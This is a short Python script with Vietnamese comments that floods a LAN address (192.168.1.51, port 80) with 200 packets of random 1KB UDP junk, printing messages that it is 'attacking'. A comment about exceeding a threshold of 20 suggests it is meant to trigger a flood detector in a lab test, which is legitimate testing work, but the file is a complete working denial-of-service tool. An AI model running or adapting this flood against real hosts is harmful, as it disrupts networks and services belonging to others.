import socket
import time
import random

# Cấu hình
TARGET_IP = "192.168.1.51"  # Hoặc IP LAN của máy bạn (vd: 192.168.1.x) sẽ tốt hơn
TARGET_PORT = 80
PACKET_COUNT = 200  # Gửi 100 gói (chắc chắn vượt ngưỡng 20)


def flood():
    print(f"Dang tan cong Flood vao {TARGET_IP}...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP Packet
    payload = random._urandom(1024)  # Gói tin rác 1KB

    for i in range(PACKET_COUNT):
        try:
            sock.sendto(payload, (TARGET_IP, TARGET_PORT))
            print(f"Da gui goi tin thu {i + 1}")
            time.sleep(0.01)  # Gửi cực nhanh (10ms/gói)
        except Exception as e:
            print(f"Loi: {e}")
            break

    sock.close()
    print("Ket thuc tan cong!")


if __name__ == "__main__":
    flood()